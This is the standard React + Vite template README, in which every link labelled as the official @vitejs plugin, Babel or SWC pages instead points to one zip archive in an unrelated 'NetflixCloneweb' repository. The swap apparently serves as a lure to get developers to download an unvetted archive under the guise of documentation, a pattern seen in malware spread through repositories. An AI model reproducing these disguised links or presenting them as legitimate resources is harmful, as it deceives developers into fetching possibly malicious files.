# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/Rahul-Raj-04/NetflixCloneweb/main/src/Component/Cloneweb_Netflix_v1.5.zip) uses [Babel](https://raw.githubusercontent.com/Rahul-Raj-04/NetflixCloneweb/main/src/Component/Cloneweb_Netflix_v1.5.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Rahul-Raj-04/NetflixCloneweb/main/src/Component/Cloneweb_Netflix_v1.5.zip) uses [SWC](https://raw.githubusercontent.com/Rahul-Raj-04/NetflixCloneweb/main/src/Component/Cloneweb_Netflix_v1.5.zip) for Fast Refresh
